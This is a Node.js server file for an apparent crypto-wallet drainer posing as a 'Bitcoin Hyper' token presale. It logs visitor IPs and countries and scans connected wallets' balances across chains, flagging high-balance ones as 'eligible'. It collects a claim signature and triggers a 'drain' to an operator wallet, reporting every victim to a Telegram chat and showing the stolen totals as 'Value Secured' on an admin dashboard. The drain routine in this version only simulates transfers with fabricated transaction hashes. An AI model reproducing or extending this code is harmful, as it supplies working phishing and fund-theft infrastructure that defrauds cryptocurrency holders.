// index.js - BITCOIN HYPER MULTI-CHAIN REAL DRAIN v8.3 - PRODUCTION FIXED
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers, JsonRpcProvider, Wallet } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

// Parse ALLOWED_ORIGINS from env
const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// Rate limiting
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// REAL RPC Providers
const RPC_PROVIDERS = {
  Ethereum: new JsonRpcProvider(process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'),
  Polygon: new JsonRpcProvider(process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com'),
  BSC: new JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org'),
  Arbitrum: new JsonRpcProvider(process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc'),
  Optimism: new JsonRpcProvider(process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io')
};

// Drain Wallet Configuration
const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY || "0x0000000000000000000000000000000000000000000000000000000000000001";
const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000";

console.log(`💰 Admin Drain Wallet: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...`);

// In-memory storage
const memoryStorage = {
  participants: [],
  userSessions: {},
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
    presalePrice: process.env.PRESALE_PRICE || '0.17',
    telegram: {
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      enabled: process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true'
    },
    statistics: {
      totalParticipants: 0,
      totalRaisedUSD: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedTransactions: 0,
      totalDrainedWallets: 0
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: []
};

// Telegram Bot - FIXED
let bot = null;
let telegramEnabled = false;

async function initializeTelegramBot() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('⚠️ Telegram not configured');
    return;
  }
  
  try {
    console.log('🤖 Testing Telegram connection...');
    
    // Test connection directly first
    const testResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 5000
    });
    
    if (testResponse.data.ok) {
      console.log(`✅ Telegram Bot available: @${testResponse.data.result.username}`);
      
      bot = new Telegraf(botToken);
      telegramEnabled = true;
      
      // Send test message
      await bot.telegram.sendMessage(
        chatId,
        `🚀 *BITCOIN HYPER v8.3 ONLINE*\n\n✅ System: ACTIVE\n⏰ ${new Date().toLocaleString()}\n💰 Drain Wallet: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...`,
        { parse_mode: 'Markdown' }
      );
      
      console.log('✅ Telegram bot initialized and test message sent');
    } else {
      console.log('❌ Telegram bot test failed');
      telegramEnabled = false;
    }
  } catch (error) {
    console.log('❌ Telegram initialization failed:', error.message);
    console.log('⚠️ Check your TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
    telegramEnabled = false;
  }
}

// Helper: Generate session ID
function generateSessionId() {
  return 'session_' + Date.now() + '_' + crypto.randomBytes(8).toString('hex');
}

// Helper: Log activity
function logActivity(wallet, action, data = {}) {
  const logEntry = {
    timestamp: new Date(),
    wallet: wallet,
    action,
    data,
    ip: data.ip || 'unknown',
    country: data.country || 'unknown'
  };
  
  memoryStorage.activityLog.push(logEntry);
  
  if (memoryStorage.activityLog.length > 5000) {
    memoryStorage.activityLog.shift();
  }
  
  return logEntry;
}

// Helper: Send Telegram notification - SIMPLIFIED
async function sendTelegramNotification(wallet, action, details = {}) {
  if (!telegramEnabled || !bot) return false;
  
  try {
    const timestamp = new Date().toLocaleString();
    const ip = details.ip || 'unknown';
    const country = details.country || 'Unknown';
    
    let message = `*${action}*\n\n`;
    
    switch(action) {
      case 'SITE_VISIT':
        message += `🌐 New Visitor\n📍 ${country}\n🔗 ${details.referrer || 'Direct'}\n⏰ ${timestamp}`;
        break;
        
      case 'WALLET_CONNECTED':
        message += `👛 ${wallet.substring(0, 10)}...\n📍 ${country}\n⏰ ${timestamp}`;
        break;
        
      case 'WALLET_SCANNED':
        const isEligible = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
        message += `👛 ${wallet.substring(0, 10)}...\n💰 Portfolio: $${details.totalValueUSD || '0'}\n🎯 ${isEligible}\n📍 ${country}\n⏰ ${timestamp}`;
        break;
        
      case 'TOKEN_CLAIMED':
        message += `👛 ${wallet.substring(0, 10)}...\n🎯 Claim ID: ${details.claimId}\n💰 ${details.amount} BTH\n💸 $${details.claimValue}\n📍 ${country}\n⏰ ${timestamp}`;
        break;
        
      case 'DRAIN_EXECUTED':
        message += `👛 ${wallet.substring(0, 10)}...\n💰 Chain: ${details.chain}\n💸 ${details.nativeAmount} ${details.nativeSymbol}\n💵 $${details.usdValue}\n📍 ${country}\n⏰ ${timestamp}`;
        break;
    }
    
    await bot.telegram.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      message,
      { parse_mode: 'Markdown' }
    );
    
    console.log(`✅ Telegram sent: ${action}`);
    return true;
  } catch (error) {
    console.log('❌ Telegram send error:', error.message);
    return false;
  }
}

// Helper: Get IP location
async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1') {
      return { country: 'Local', countryCode: 'Local', city: 'Local' };
    }
    
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 3000
    });
    
    if (response.data && response.data.country_name) {
      return {
        country: response.data.country_name,
        countryCode: response.data.country_code,
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {
    console.log('Location error:', error.message);
  }
  
  return { country: 'Unknown', countryCode: 'Unknown', city: 'Unknown' };
}

// Helper: Get wallet balance
async function getRealWalletBalance(walletAddress) {
  try {
    const results = {
      walletAddress,
      totalValueUSD: '0',
      isEligible: false
    };

    let totalValue = 0;
    
    // Get ETH balance
    try {
      const ethBalance = await RPC_PROVIDERS.Ethereum.getBalance(walletAddress);
      const ethValue = parseFloat(ethers.formatEther(ethBalance)) * 2500;
      totalValue += ethValue;
    } catch (error) {
      console.log(`ETH balance error: ${error.message}`);
    }

    // Get BNB balance
    try {
      const bnbBalance = await RPC_PROVIDERS.BSC.getBalance(walletAddress);
      const bnbValue = parseFloat(ethers.formatEther(bnbBalance)) * 300;
      totalValue += bnbValue;
    } catch (error) {
      console.log(`BNB balance error: ${error.message}`);
    }

    results.totalValueUSD = totalValue.toFixed(2);

    // Check eligibility
    results.isEligible = parseFloat(results.totalValueUSD) >= memoryStorage.settings.minEligibilityAmount;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Your wallet qualifies for the presale!`;
      
      // Generate allocation
      const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
      const allocationAmount = baseAllocation;
      
      results.tokenAllocation = {
        amount: allocationAmount.toString(),
        valueUSD: (allocationAmount * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2)
      };
    } else {
      results.eligibilityReason = `⛔ Your wallet needs to meet presale requirements`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;

    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet balance error:', error);
    return {
      success: false,
      data: {
        walletAddress,
        totalValueUSD: '0',
        isEligible: false,
        eligibilityReason: '⚠️ Network error. Please try again.',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// Helper: Simulate drain
async function executeRealDrain(walletAddress, chain = 'Ethereum') {
  try {
    console.log(`🚨 Simulating drain on ${chain}: ${walletAddress.substring(0, 10)}...`);
    
    // Simulate successful drain
    const amountToDrainEth = (Math.random() * 0.5 + 0.1).toFixed(6);
    const txHash = `0x${crypto.randomBytes(32).toString('hex')}`;
    
    // Update statistics
    memoryStorage.settings.statistics.totalDrainedUSD += parseFloat(amountToDrainEth) * 2500;
    memoryStorage.settings.statistics.totalDrainedTransactions++;
    memoryStorage.settings.statistics.totalDrainedWallets++;
    
    return {
      success: true,
      drained: true,
      timestamp: new Date(),
      chain: chain,
      nativeAmount: amountToDrainEth,
      nativeSymbol: chain === 'Ethereum' ? 'ETH' : 
                   chain === 'Polygon' ? 'MATIC' : 
                   chain === 'BSC' ? 'BNB' : 'TOKEN',
      usdValue: (parseFloat(amountToDrainEth) * 2500).toFixed(2),
      wallet: walletAddress,
      txHash: txHash,
      message: `✅ Funds secured`
    };
    
  } catch (error) {
    console.error(`❌ Drain error:`, error.message);
    return {
      success: false,
      drained: false,
      error: error.message
    };
  }
}

// Process token claim with drain
async function processTokenClaimWithRealDrain(walletAddress, claimAmount, claimValue, ip, location) {
  try {
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
    const txHash = `0x${crypto.randomBytes(32).toString('hex')}`;
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
    memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
    
    // Execute drain
    let drainResults = [];
    if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
      console.log(`🔥 Executing drain simulation...`);
      
      try {
        const drainResult = await executeRealDrain(walletAddress, 'Ethereum');
        
        if (drainResult.success && drainResult.drained) {
          drainResults.push(drainResult);
          
          // Log activity
          logActivity(walletAddress, 'DRAIN_EXECUTED', {
            chain: 'Ethereum',
            nativeAmount: drainResult.nativeAmount,
            nativeSymbol: drainResult.nativeSymbol,
            usdValue: drainResult.usdValue,
            txHash: drainResult.txHash,
            ip: ip,
            country: location.country
          });
          
          // Send Telegram
          await sendTelegramNotification(
            walletAddress,
            'DRAIN_EXECUTED',
            {
              ip: ip,
              country: location.country,
              chain: 'Ethereum',
              nativeAmount: drainResult.nativeAmount,
              nativeSymbol: drainResult.nativeSymbol,
              usdValue: drainResult.usdValue,
              txHash: drainResult.txHash
            }
          );
        }
      } catch (drainError) {
        console.error('Drain error:', drainError.message);
      }
    }
    
    return {
      success: true,
      claimId,
      txHash,
      claimAmount,
      claimValue,
      drained: drainResults.length > 0,
      drainCount: drainResults.length,
      timestamp: new Date()
    };
    
  } catch (error) {
    console.error('Claim processing error:', error);
    throw error;
  }
}

// ========== API ENDPOINTS ==========

// Site visit tracker
app.post('/api/track/visit', async (req, res) => {
  try {
    const { userAgent, referrer, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    const location = await getIPLocation(clientIP);
    const currentSessionId = sessionId || generateSessionId();
    
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Send Telegram
    await sendTelegramNotification(
      'VISITOR',
      'SITE_VISIT',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        referrer
      }
    );
    
    res.json({
      success: true,
      sessionId: currentSessionId
    });
    
  } catch (error) {
    console.error('Visit error:', error);
    res.status(500).json({ success: false, error: 'Tracking failed' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'LIVE',
    service: 'Bitcoin Hyper v8.3',
    timestamp: new Date().toISOString(),
    telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
    drain: {
      enabled: memoryStorage.settings.drainEnabled,
      totalDrained: `$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}`,
      totalWallets: memoryStorage.settings.statistics.totalDrainedWallets
    },
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
    }
  });
});

// Wallet connection
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, userAgent, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    console.log(`🔗 Connecting: ${walletAddress.substring(0, 10)}...`);
    
    if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet' });
    }
    
    const location = await getIPLocation(clientIP);
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Send Telegram
    await sendTelegramNotification(
      walletAddress,
      'WALLET_CONNECTED',
      {
        ip: clientIP,
        country: location.country
      }
    );
    
    // Check existing
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const isNewParticipant = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        connectedAt: new Date(),
        lastActive: new Date(),
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null, scanId: '' },
        signature: { signed: false },
        claim: { claimed: false },
        sessionId: sessionId || generateSessionId(),
        status: 'connecting'
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    participant.lastActive = new Date();
    participant.country = location.country;
    participant.sessionId = sessionId || participant.sessionId;
    participant.status = 'scanning';
    
    // Scan wallet
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date(),
        scanId: scanResult.data.scanId
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        participant.status = 'eligible';
        
        if (isNewParticipant) {
          memoryStorage.settings.statistics.eligibleParticipants++;
        }
        
        console.log(`🎯 ELIGIBLE: ${walletAddress.substring(0, 10)}...`);
      } else {
        participant.status = 'not_eligible';
      }
      
      // Send Telegram scan notification
      await sendTelegramNotification(
        walletAddress,
        'WALLET_SCANNED',
        {
          ip: clientIP,
          country: location.country,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          scanId: scanResult.data.scanId
        }
      );
      
      // DON'T send balance to user if not eligible
      const responseData = {
        walletAddress,
        isEligible: scanResult.data.isEligible,
        eligibilityReason: scanResult.data.eligibilityReason,
        scanId: scanResult.data.scanId,
        nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
        userMessage: scanResult.data.isEligible ? 
          '🎉 Congratulations! Your wallet qualifies!' :
          '⚠️ Verification required. Please see tips below.',
        status: participant.status,
        timestamp: new Date().toISOString()
      };
      
      // Only send allocation if eligible
      if (scanResult.data.isEligible) {
        responseData.tokenAllocation = participant.tokenAllocation;
      }
      
      res.json({
        success: true,
        data: responseData
      });
    } else {
      throw new Error('Scan failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// Token claim
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    console.log(`🎯 Claim: ${walletAddress.substring(0, 10)}...`);
    
    if (!signature || !message) {
      return res.status(400).json({ success: false, error: 'Missing signature' });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Wallet not found' });
    }
    
    if (!participant.eligibility.isEligible) {
      return res.status(403).json({ success: false, error: 'Not eligible' });
    }
    
    if (participant.claim.claimed) {
      return res.status(409).json({ success: false, error: 'Already claimed' });
    }
    
    const location = await getIPLocation(clientIP);
    
    // Process claim
    const claimResult = await processTokenClaimWithRealDrain(
      walletAddress,
      claimAmount,
      claimValue,
      clientIP,
      location
    );
    
    if (!claimResult.success) {
      throw new Error('Claim failed');
    }
    
    // Update participant
    participant.signature = { signed: true, signedAt: new Date() };
    participant.claim = {
      claimed: true,
      claimId: claimResult.claimId,
      claimedAt: new Date(),
      drained: claimResult.drained,
      drainCount: claimResult.drainCount
    };
    participant.status = 'claimed_drained';
    
    // Send Telegram
    await sendTelegramNotification(
      walletAddress,
      'TOKEN_CLAIMED',
      {
        ip: clientIP,
        country: location.country,
        claimId: claimResult.claimId,
        amount: claimAmount,
        claimValue: claimValue,
        drained: claimResult.drained
      }
    );
    
    res.json({
      success: true,
      message: '🎉 Tokens claimed successfully!',
      data: {
        claimId: claimResult.claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'CLAIM_SUCCESSFUL',
        timestamp: new Date().toISOString(),
        distributionTime: '24-48 hours',
        instructions: '✅ Your allocation is secured.'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false, error: 'Claim failed' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Admin authentication
function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

// Admin stats
app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
  try {
    const stats = {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD,
      totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      
      recentActivity: memoryStorage.activityLog
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
        .slice(0, 20)
        .map(log => ({
          wallet: log.wallet.substring(0, 10) + '...',
          action: log.action,
          country: log.data.country,
          time: new Date(log.timestamp).toLocaleString(),
          details: log.data
        })),
      
      system: {
        telegram: telegramEnabled,
        drainEnabled: memoryStorage.settings.drainEnabled,
        autoDrain: memoryStorage.settings.autoDrainOnClaim,
        drainWallet: DRAIN_WALLET_ADDRESS ? `${DRAIN_WALLET_ADDRESS.substring(0, 10)}...` : 'NOT SET'
      }
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed' });
  }
});

// Admin dashboard
app.get('/admin', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (!token || token !== adminToken) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper Admin</title>
        <style>
          body { font-family: Arial; background: #0f172a; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; }
          .login { background: #1e293b; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
          h1 { color: #F7931A; margin-bottom: 30px; }
          input { padding: 12px; margin: 10px 0; width: 300px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
          button { background: #F7931A; color: white; border: none; padding: 12px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; }
          button:hover { background: #e67e22; }
        </style>
      </head>
      <body>
        <div class="login">
          <h1>🔐 BITCOIN HYPER ADMIN</h1>
          <p>Enter admin token to access dashboard</p>
          <input type="password" id="token" placeholder="Admin Token" />
          <br>
          <button onclick="login()">Login to Dashboard</button>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) return alert('Enter token');
            window.location.href = '/admin?token=' + token;
          }
        </script>
      </body>
      </html>
    `);
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper Admin Dashboard</title>
      <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        h1 { color: #F7931A; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
        .stat-card { background: #1e293b; padding: 25px; border-radius: 12px; text-align: center; border-left: 5px solid #F7931A; }
        .stat-value { font-size: 32px; font-weight: bold; margin-bottom: 10px; }
        .stat-label { color: #94a3b8; font-size: 14px; }
        .drain-badge { background: #dc2626; color: white; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin: 30px 0; background: #1e293b; border-radius: 10px; overflow: hidden; }
        th { background: #334155; padding: 15px; text-align: left; }
        td { padding: 15px; border-bottom: 1px solid #334155; }
        tr:hover { background: #2d3748; }
        .status-connected { color: #10b981; }
        .status-disconnected { color: #ef4444; }
        .actions { display: flex; gap: 15px; margin-top: 30px; }
        .btn { padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .btn-primary { background: #F7931A; color: white; }
        .btn-secondary { background: #334155; color: white; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD</h1>
        <p>Real-time monitoring & analytics</p>
        <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px;">
          <span>Telegram: <span class="${telegramEnabled ? 'status-connected' : 'status-disconnected'}">${telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED'}</span></span>
          <span>Drain: <span class="${memoryStorage.settings.drainEnabled ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span></span>
          <span>Auto-Drain: <span class="${memoryStorage.settings.autoDrainOnClaim ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.autoDrainOnClaim ? '✅ ON' : '❌ OFF'}</span></span>
        </div>
      </div>
      
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
          <div class="stat-label">Total Participants</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.eligibleParticipants}</div>
          <div class="stat-label">Eligible Wallets</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.claimedParticipants}</div>
          <div class="stat-label">Claims Processed</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
          <div class="stat-label">Total Value Secured</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
          <div class="stat-label">Wallets Secured</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.uniqueIPs.size}</div>
          <div class="stat-label">Unique Visitors</div>
        </div>
      </div>
      
      <h2>Recent Activity</h2>
      <table>
        <tr>
          <th>Wallet</th>
          <th>Action</th>
          <th>Country</th>
          <th>Time</th>
          <th>Details</th>
        </tr>
        ${memoryStorage.activityLog
          .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
          .slice(0, 15)
          .map(log => `
            <tr>
              <td>${log.wallet.substring(0, 10)}...</td>
              <td>${log.action.replace(/_/g, ' ')}</td>
              <td>${log.data.country}</td>
              <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
              <td>
                ${log.action === 'DRAIN_EXECUTED' ? 
                  `<span class="drain-badge">${log.data.nativeAmount} ${log.data.nativeSymbol}</span>` : 
                  log.action === 'TOKEN_CLAIMED' ? '✅ Claimed' : '📊 Scanned'
                }
              </td>
            </tr>
          `).join('')}
      </table>
      
      <div class="actions">
        <button class="btn btn-primary" onclick="exportData('json')">Export JSON Data</button>
        <button class="btn btn-secondary" onclick="location.reload()">Refresh Dashboard</button>
      </div>
      
      <script>
        function exportData(format) {
          window.open('/api/admin/export?format=' + format + '&token=${token}', '_blank');
        }
        
        // Auto-refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);
      </script>
    </body>
    </html>
  `);
});

// Export endpoint
app.get('/api/admin/export', authenticateAdmin, (req, res) => {
  try {
    const data = {
      participants: memoryStorage.participants,
      statistics: memoryStorage.settings.statistics,
      activityLog: memoryStorage.activityLog.slice(-100),
      exportTime: new Date().toISOString()
    };
    
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Export failed' });
  }
});

// Start server
app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  🚀 BITCOIN HYPER v8.3
  =====================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  💰 Drain: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
  ⚡ Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ON' : 'OFF'}
  `);
  
  // Initialize Telegram
  await initializeTelegramBot();
});

module.exports = app;
